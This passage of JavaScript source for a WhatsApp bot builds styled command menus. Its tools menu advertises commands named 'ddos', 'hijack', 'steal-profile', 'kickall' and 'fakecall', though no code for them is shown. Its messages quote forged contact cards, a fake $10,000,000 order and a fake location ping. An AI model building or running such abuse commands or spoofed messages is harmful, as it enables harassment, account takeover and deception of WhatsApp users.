            contactMessage: {
                displayName: "𝚂𝙸𝚁 𝙳𝙴𝙼𝙾𝙽", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;𝗡𝗘𝗫𝗢𝗥𝗔;;;\nFN:𝗡𝗘𝗫𝗢𝗥𝗔\nitem1.TEL;waid=${myNumber5}:${myNumber5}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: xxxBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "📁 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚍𝚞𝚌𝚝𝚜",
                body: "🛒 Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: xxxBannerPath,
                sourceUrl: xxxBannerPath,
                renderLargerThumbnail: false, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;


case 'groupmenu': 
case '2️⃣': {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const groupBannerPath = getRandomImage('./media/banners/');
    const groupBuffer = fs.readFileSync(groupBannerPath);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`GROUPS COMMANDS\` 〕
 *├─⌬* ${prefix}*𝗵𝗶𝗱𝗲𝘁𝗮𝗴*
 *├─⌬* ${prefix}*𝗮𝘂𝘁𝗼𝗹𝗼𝗰𝗸*
 *├─⌬* ${prefix}gcsettings
 *├─⌬* ${prefix}*autoreact*
 *├─⌬* ${prefix}*antigcmention*
 *├─⌬* ${prefix}*antigroupmention*
 *├─⌬* ${prefix}*𝘁𝗮𝗴𝗮𝗹𝗹*
 *├─⌬* ${prefix}*𝗔𝗻𝘁𝗶𝘁𝘁𝗮𝗴𝗮𝗹𝗹 𝗼𝗻/𝗼𝗳𝗳*
 *├─⌬* ${prefix}*𝘀𝘁𝗮𝘁𝘀*
 *├─⌬* ${prefix}*𝗽𝗼𝗹𝗹*
 *├─⌬* ${prefix}gcsettings
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗿𝗮𝗶𝗱 𝗼𝗻/𝗼𝗳𝗳*
 *├─⌬* ${prefix}*𝘀𝗲𝗰𝘂𝗿𝗶𝘁𝘆*
 *├─⌬* ${prefix}*𝘀𝗹𝗼𝘄𝗺𝗼𝗱𝗲 <seconds>*
 *├─⌬* ${prefix}*𝗷𝗮𝗶𝗹*
 *├─⌬* ${prefix}*𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗮𝗹𝗹*
 *├─⌬* ${prefix}*𝘂𝗻ջ𝗮𝗶𝗹*
 *├─⌬* ${prefix}*𝘀𝗶𝗹𝗲𝗻𝗰𝗲*
 *├─⌬* ${prefix}*𝗮𝘂𝘁𝗼𝗵𝗲𝗮𝗹*
 *├─⌬* ${prefix}*𝗹𝗼𝗰𝗸𝗺𝗲𝗱𝗶𝗮*
 *├─⌬* ${prefix}*𝘄𝗮𝗿𝗻*
 *├─⌬* ${prefix}*𝗿𝗲𝘀𝗲𝘁𝘄𝗮𝗿𝗻*
 *├─⌬* ${prefix}*𝘄𝗮𝗿𝗻𝗹𝗶𝘀𝘁*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝘁𝗮𝗴𝗮𝗹𝗹*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝘀𝗽𝗮𝗺 𝗼𝗻/𝗼𝗳𝗳*
 *├─⌬* ${prefix}*𝗱𝗲𝗺𝗼𝘁𝗲*
 *├─⌬* ${prefix}*𝗰𝗵𝗰𝗸𝗯𝗼𝘁*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗱𝗲𝗺𝗼𝘁𝗲*
 *├─⌬* ${prefix}*𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗮𝗹𝗹*
 *├─⌬* ${prefix}*𝗵𝗶𝗷𝗮𝗰𝗸*
 *├─⌬* ${prefix}*𝗽𝗿𝗼𝗺𝗼𝘁𝗲*
 *├─⌬* ${prefix}*𝗺𝘂𝘁𝗲*
 *├─⌬* ${prefix}*𝗸𝗶𝗰𝗸𝗮𝗱𝗺𝗶𝗻𝘀*
 *├─⌬* ${prefix}*𝘂𝗻𝗺𝘂𝘁𝗲*
 *├─⌬* ${prefix}*𝗷𝗼𝗶𝗻*
 *├─⌬* ${prefix}*𝗴𝗿𝗼𝘂𝗼𝗷𝗶𝗱*
 *├─⌬* ${prefix}*𝗴𝗰𝗶𝗻𝗳𝗼*
 *├─⌬* ${prefix}*𝗸𝗶𝗰𝗸*
 *├─⌬* ${prefix}*𝗴𝗲𝘁𝗽𝗽𝗴𝗰*
 *├─⌬* ${prefix}*𝗽𝗿𝗼𝗳𝗶𝗹𝗲𝗴𝗰*
 *├─⌬* ${prefix}*𝗹𝗲𝗳𝘁*
 *├─⌬* ${prefix}*𝗮𝗱𝗱*
 *├─⌬* ${prefix}*𝗰𝗿𝗲𝗮𝘁𝗲𝗴ᱨ𝗼𝘂𝗽*
 *├─⌬* ${prefix}*𝗿𝗲𝘀𝗲𝘁𝗹𝗶𝗻𝗸*
 *├─⌬* ${prefix}*𝘁𝗮𝗴*
 *├─⌬* ${prefix}*𝗹𝗶𝘀𝘁𝗮𝗱𝗺𝗶𝗻𝘀*
 *├─⌬* ${prefix}*𝗹𝗶𝘀𝘁𝗼𝗻𝗹𝗶𝗻𝗲*
 *├─⌬* ${prefix}*𝗰𝗹𝗼𝘀𝗲𝘁𝗶𝗺𝗲*
 *├─⌬* ${prefix}*𝗼𝗽𝗲𝗻𝘁𝗶𝗺𝗲*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗹𝗶𝗻𝗸 𝗼𝗻/𝗼𝗳𝗳*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗹𝗶𝗻𝗸 𝘄𝗮𝗿𝗻*
 *├─⌬* ${prefix}*𝗮𝗻𝘁𝗶𝗹𝗶𝗻𝗸 𝗱𝗲𝗹𝗲𝘁𝗲*
 *├─⌬* ${prefix}*𝗴𝗿𝗼𝘂𝗽𝗹𝗶𝗻𝗸*
 *├─⌬* ${prefix}*𝗸𝗶𝗰𝗸𝗮𝗹𝗹*
 *├─⌬* ${prefix}*𝘀𝗲𝘁𝗴𝗰𝗻𝗮𝗺𝗲*
 *├─⌬* ${prefix}*𝘀𝗲𝘁𝗴𝗰𝗽𝗽*
 *├─⌬* ${prefix}*TOP* 
 *├─⌬* ${prefix}*LEADERBOARD* └──────────────────────────⬡

`;

    const myNumber6 = '2349118304002'; 
    const myJid = `${myNumber6}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "𝚂𝙸𝚁 𝙳𝙴𝙼𝙾𝙽", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;𝗡𝗘𝗫𝗢𝗥𝗔;;;\nFN:𝗡𝗘𝗫𝗢𝗥𝗔\nitem1.TEL;waid=${myNumber6}:${myNumber6}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: groupBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "📁 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚍𝚞𝚌𝚝𝚜",
                body: "🛒 2026 𝙸𝚝𝚎𝚖𝚜 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚎 © Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: groupBannerPath,
                sourceUrl: "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12",
                renderLargerThumbnail: false, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;
case 'downloadmenu': 
case '5️⃣': {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const downloadBannerPath = getRandomImage('./media/banners/');
    const downloadBuffer = fs.readFileSync(downloadBannerPath);

    const text = `
╔══════════════════════╗
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*

┌─〔  \`DOWNLOAD COMMANDS\` 〕
 *├─⌬* ${prefix}*𝗮𝗻𝗶𝗺𝗲𝘀𝗲𝗮𝗿𝗰𝗵*
 *├─⌬* ${prefix}*𝘃𝘃, 𝘄𝗼𝘄, 𝗵𝗼𝘁 , 👀, 🤧 🔥 🥹 👁️*
 *├─⌬* ${prefix}*𝘃𝘃𝟮*
 *├─⌬* ${prefix}*𝘁𝗼𝘀𝘁𝗶𝗰𝗸𝗲𝗿*
 *├─⌬* ${prefix}*𝘀𝗮𝘃𝗲*
 *├─⌬* ${prefix}*𝘁𝗶𝗸𝘁𝗼𝗸*
 *├─⌬* ${prefix}*𝘁𝗼𝗶𝗺𝗴*
 *├─⌬* ${prefix}*𝘆𝘁𝘀𝗲𝗮𝗿𝗰𝗵*
 *├─⌬* ${prefix}*𝗺𝗼𝘃𝗶𝗲*
 *├─⌬* ${prefix}*𝗺𝗼𝘃𝗶𝗲𝗾𝘂𝗼𝘁𝗲*
 *├─⌬* ${prefix}*𝘁𝗼𝗺𝗽𝟯*
 *├─⌬* ${prefix}*𝘁𝗼𝗺𝗽𝟰*
 *├─⌬* ${prefix}*𝘁𝗼𝘂𝗿𝗹*
 *├─⌬* ${prefix}*𝗮𝗽𝗸*
 *├─⌬* ${prefix}*𝗮𝗽𝗸𝟮*
 *├─⌬* ${prefix}*𝗽𝗱𝗳𝘁𝗼𝘁𝗲𝘅𝘁*
 *├─⌬* ${prefix}*𝗾𝗿𝗰𝗼𝗱𝗲*
 *├─⌬* ${prefix}*𝘀𝗵𝗼𝗿𝘁𝘂𝗿𝗹*
 *├─⌬* ${prefix}*𝘀𝗮𝘆*
 *├─⌬* ${prefix}*𝘀𝗮𝘃𝗲𝘀𝘁𝗮𝘁𝘂𝘀*
└─────────────────────────⬡
`;

    const myNumber7 = '2349118304002'; 
    const myJid = `${myNumber7}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "𝚂𝙸𝚁 𝙳𝙴𝙼𝙾𝙽", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;𝗡𝗘𝗫𝗢𝗥𝗔;;;\nFN:𝗡𝗘𝗫𝗢𝗥𝗔\nitem1.TEL;waid=${myNumber7}:${myNumber7}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
     };

    await empire.sendMessage(m.chat, {
        image: { url: downloadBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "📁 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚍𝚞𝚌𝚝𝚜",
                body: "🛒 2026 𝙸𝚝𝚎𝚖𝚜 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚎 © Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: downloadBannerPath,
                sourceUrl: "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12",
                renderLargerThumbnail: false, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;

case 'footballmenu': 
case '⚽' : {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const footballBannerPath = getRandomImage('./media/banners/');
    const footballBuffer = fs.readFileSync(footballBannerPath);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝

┌─〔 ⚽ \`SOCCER MENU\` ⚽ 〕
 *├─⌬* ${prefix}*football*
 *├─⌬* ${prefix}*table*
 *├─⌬* ${prefix}*club*
 *├─⌬* ${prefix}*team*
 *├─⌬* ${prefix}*soccer*
 *├─⌬* ${prefix}*player*
 *├─⌬* ${prefix}*livescore*
 *├─⌬* ${prefix}*table2*
 *├─⌬* ${prefix}*standing2*
 *├─⌬* ${prefix}*standings2*
 *├─⌬* ${prefix}*live*
 *├─⌬* ${prefix}*fixture*
 *├─⌬* ${prefix}*fixtures*
 *├─⌬* ${prefix}*nextmatch*
└─────────────────────────⬡
`;

    const myNumber8 = '2349118304002'; 
    const myJid = `${myNumber8}@s.whatsapp.net`;

    const fakeContact = {
        key: {
            remoteJid: 'status@broadcast', 
            fromMe: false,
            participant: '0@s.whatsapp.net' 
        },
        message: {
            contactMessage: {
                displayName: "𝚂𝙸𝚁 𝙳𝙴𝙼𝙾𝙽", 
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;𝗡𝗘𝗫𝗢𝗥𝗔;;;\nFN:𝗡𝗘𝗫𝗢𝗥𝗔\nitem1.TEL;waid=${myNumber8}:${myNumber8}\nitem1.X-ABLabel:Owner\nEND:VCARD`
            }
        }
    };

    await empire.sendMessage(m.chat, {
        image: { url: footballBannerPath },
        caption: text,
        contextInfo: {
            externalAdReply: {
                title: "📁 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚍𝚞𝚌𝚝𝚜",
                body: "🛒 2026 𝙸𝚝𝚎𝚖𝚜 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚎 © Xyron 𝚃𝚎𝚌𝚑", 
                mediaType: 1,
                previewType: "PHOTO",
                thumbnailUrl: footballBannerPath,
                sourceUrl: "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12",
                renderLargerThumbnail: false, 
                showAdAttribution: true
            },
            forwardingScore: 999,
            isForwarded: false
        }
    }, { quoted: fakeContact });
}
break;


case 'stickermenu': 
case '7️⃣': {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const stickerBannerPath = getRandomImage('./media/banners/');
    const stickerBuffer = fs.readFileSync(stickerBannerPath);

    const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`STICKER & REACTIONS\` 〕
 *├─⌬* ${prefix}*cry*
 *├─⌬* ${prefix}*kill*
 *├─⌬* ${prefix}*hug*
 *├─⌬* ${prefix}*lick*
 *├─⌬* ${prefix}*wink*
 *├─⌬* ${prefix}*yeet*
 *├─⌬* ${prefix}*bully*
 *├─⌬* ${prefix}*bonk*
 *├─⌬* ${prefix}*wink*
 *├─⌬* ${prefix}*bite*
 *├─⌬* ${prefix}*nom*
 *├─⌬* ${prefix}*smile*
 *├─⌬* ${prefix}*slap*
 *├─⌬* ${prefix}*wave*
 *├─⌬* ${prefix}*blush*
 *├─⌬* ${prefix}*poke*
 *├─⌬* ${prefix}*smug*
 *├─⌬* ${prefix}*dance*
 *├─⌬* ${prefix}*cringe*
 *├─⌬* ${prefix}*cuddle*
 *├─⌬* ${prefix}*highfive*
 *├─⌬* ${prefix}*shinobu*
 *├─⌬* ${prefix}*handhold*
 *├─⌬* ${prefix}*happy*
 *├─⌬* ${prefix}*pat*
└─────────────────────────⬡
`;

    const nexoraStyles = [
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    await empire.sendMessage(m.chat, {
        image: stickerBuffer,
        caption: text,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true,
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnail: stickerBuffer,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false 
            }
        }
    }, { quoted: pickStyle });

    await empire.sendMessage(m.chat, { react: { text: '💫', key: m.key } });
}
break;



case 'aimenu':
case 'toolsmenu':
case '8️⃣':  {
    const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";
    let botName = global.botName ? global.botName : "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2";

    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
    // Local Image Logic
    const toolsBannerPath = getRandomImage('./media/banners/');
    const toolsBuffer = fs.readFileSync(toolsBannerPath);

    const text =`
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`Ai & TOOLS\` 〕
 *├─⌬* ${prefix}*ai*
 *├─⌬* ${prefix}*claude*
 *├─⌬* ${prefix}*sandbox*
 *├─⌬* ${prefix}*stalkgithub*
 *├─⌬* ${prefix}*github*
 *├─⌬* ${prefix}*book* 
 *├─⌬* ${prefix}*invoice* 
 *├─⌬* ${prefix}*support* 
 *├─⌬* ${prefix}*wiki*
 *├─⌬* ${prefix}*steal-profile*
 *├─⌬* ${prefix}*stealprofile*
 *├─⌬* ${prefix}*source-code*
 *├─⌬* ${prefix}*Nexora-ai*
 *├─⌬* ${prefix}*akira*
 *├─⌬* ${prefix}*generate*
 *├─⌬* ${prefix}*confess*
 *├─⌬* ${prefix}*iphone*
 *├─⌬* ${prefix}*anonymous*
 *├─⌬* ${prefix}*img*
 *├─⌬* ${prefix}*meaning*
 *├─⌬* ${prefix}*asciivjxnd*
 *├─⌬* ${prefix}*dictionary*
 *├─⌬* ${prefix}*json*
 *├─⌬* ${prefix}*run*
 *├─⌬* ${prefix}*ddos*
 *├─⌬* ${prefix}*site*
 *├─⌬* ${prefix}*encodefile*
 *├─⌬* ${prefix}*hash*
 *├─⌬* ${prefix}*cat*
 *├─⌬* ${prefix}*dog*
 *├─⌬* ${prefix}*panda*
 *├─⌬* ${prefix}*eval*
 *├─⌬* ${prefix}*manga*
 *├─⌬* ${prefix}*paptt*
 *├─⌬* ${prefix}*ascii*
 *├─⌬* ${prefix}*roast*
 *├─⌬* ${prefix}*compliment*
 *├─⌬* ${prefix}*compliment2*
 *├─⌬* ${prefix}*sfw*
 *├─⌬* ${prefix}*aipic*
 *├─⌬* ${prefix}*moe*
 *├─⌬* ${prefix}*carimage*
 *├─⌬* ${prefix}*animedance*
 *├─⌬* ${prefix}*idch*
 *├─⌬* ${prefix}*jid*
 *├─⌬* ${prefix}*getpp*
 *├─⌬* ${prefix}*device*
 *├─⌬* ${prefix}*qc*
 *├─⌬* ${prefix}*tweet*
 *├─⌬* ${prefix}*tweet2*
 *├─⌬* ${prefix}*genpass*
 *├─⌬* ${prefix}*myip*
 *├─⌬* ${prefix}*tgstalk*
 *├─⌬* ${prefix}*currency*
 *├─⌬* ${prefix}*time*
 *├─⌬* ${prefix}*weather*
 *├─⌬* ${prefix}*weather2*
 *├─⌬* ${prefix}*calculate*
 *├─⌬* ${prefix}*vcard*
 *├─⌬* ${prefix}*tovv*
 *├─⌬* ${prefix}*vanish*
 *├─⌬* ${prefix}*find*
 *├─⌬* ${prefix}*fakecall*
 *├─⌬* ${prefix}*credits*
└─────────────────────────⬡
`;

    const nexoraStyles = [
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                orderMessage: {
                    itemCount: 2026,
                    status: 10,
                    surface: 10,
                    message: `𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗠𝗘𝗡𝗨`,
                    orderTitle: "NEXORA SYSTEM",
                    sellerJid: '0@s.whatsapp.net',
                    totalAmount1000: "10000000",
                    totalCurrencyCode: "USD",
                }
            }
        },
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                liveLocationMessage: {
                    degreesLatitude: 6.5244,
                    degreesLongitude: 3.3792,
                    caption: "🛰️ †Location Pinged †",
                    sequenceNumber: "16566",
                    jpegThumbnail: "" 
                }
            }
        },
        {
            key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' },
            message: {
                pollCreationMessage: {
                    name: "⚙️ ©EMPIRE TECH",
                    options: [{ optionName: "SECURE ACCESS" }, { optionName: "OPTIMIZED MODE" }],
                    selectableOptionsCount: 1
                }
            }
        }
    ];

    const pickStyle = nexoraStyles[Math.floor(Math.random() * nexoraStyles.length)];

    await empire.sendMessage(m.chat, {
        image: toolsBuffer,
        caption: text,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 1,
            isForwarded: false,
            externalAdReply: {
                showAdAttribution: true,
                title: "© †SIR DEMON†",
                body: "Powered by Empire Tech",
                mediaType: 1,
                thumbnail: toolsBuffer,
                sourceUrl: "https://wa.me/2349168095230",
               renderLargerThumbnail: false
            }
        }
    }, { quoted: pickStyle });

    await empire.sendMessage(m.chat, { react: { text: '🤖', key: m.key } });
}
break;

case 'funmenu':
case 'gamemenu': 
case '9️⃣': {
const moment = require('moment-timezone');
    const time = moment.tz('Africa/Lagos').format('HH:mm:ss');
    const date = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
    const day = moment.tz('Africa/Lagos').format('dddd');
    
    // Set botMood to Neutral if it hasn't been set yet
    let botMood = global.botMood ? global.botMood : "Neutral 🙂";

    // Greeting logic
    const hour = moment.tz('Africa/Lagos').get('hour');
    let wish = "Good Night 🌙";
    if (hour >= 5) wish = "Good Morning 🌅";
    if (hour >= 12) wish = "Good Afternoon ☀️";
    if (hour >= 17) wish = "Good Evening 🌆";
    
const menuImages = [
  'https://files.catbox.moe/wiiv8w.jpg',
        "https://files.catbox.moe/s58pbl.jpg",
        "https://files.catbox.moe/wiiv8w.jpg",
        "https://files.catbox.moe/gbvy74.jpg",
        "https://files.catbox.moe/23mm4r.jpg",
        "https://files.catbox.moe/ddnmx2.jpg",
        "https://files.catbox.moe/8ztoi3.jpg",
        "https://files.catbox.moe/r6b29s.jpg",
        'https://files.catbox.moe/2ldeiw.jpg',
        'https://files.catbox.moe/f6zv1u.jpg',
        'https://files.catbox.moe/aynz69.jpg',
        'https://files.catbox.moe/k2a5vj.jpg',
    ];

    const funmenuimg = menuImages[Math.floor(Math.random() * menuImages.length)];
const text = `
*╭──────────────────╮*
*│*   *NEXORA MD v3.0.0*
*├──────────────────┤*
*│*👤 Owner  : ${m.pushName}   
*│*📅 Date   : ${date}
*│*⏰ Time   : ${time}         
*│*🗓️ Day    : ${day}
*├──────────────────┤*
*│*✨ *Status* : *Active*        
*│*🎭 *Mood*   : *${botMood}*
*│*🛡️ Mode   : *${global.status ? 'Public' : 'Private'}*
*├──────────────────┤*
*│*🚀 Link 1 : t.me/nexoramdbot
*│*🚀 Link 2 : t.me/nexoram_mdbot
*╰──────────────────╯*
╔═════════════════════╗
║Nexora md v3 📝       
╚═════════════════════╝
┌─〔  \`Funs & Games\` 〕
 *├─⌬* ${prefix}*dice*
 *├─⌬* ${prefix}*coin*
 *├─⌬* ${prefix}*guess*
 *├─⌬* ${prefix}*tictactoe*
 *├─⌬* ${prefix}*emojiquiz*
 *├─⌬* ${prefix}*rps*
 *├─⌬* ${prefix}*math*
 *├─⌬* ${prefix}*ball*
 *├─⌬* ${prefix}*wordchain*
 *├─⌬* ${prefix}*trivia*
 *├─⌬* ${prefix}*progquote*
 *├─⌬* ${prefix}*joke*
 *├─⌬* ${prefix}*prog*
 *├─⌬* ${prefix}*vkfkk*
 *├─⌬* ${prefix}*8ball*
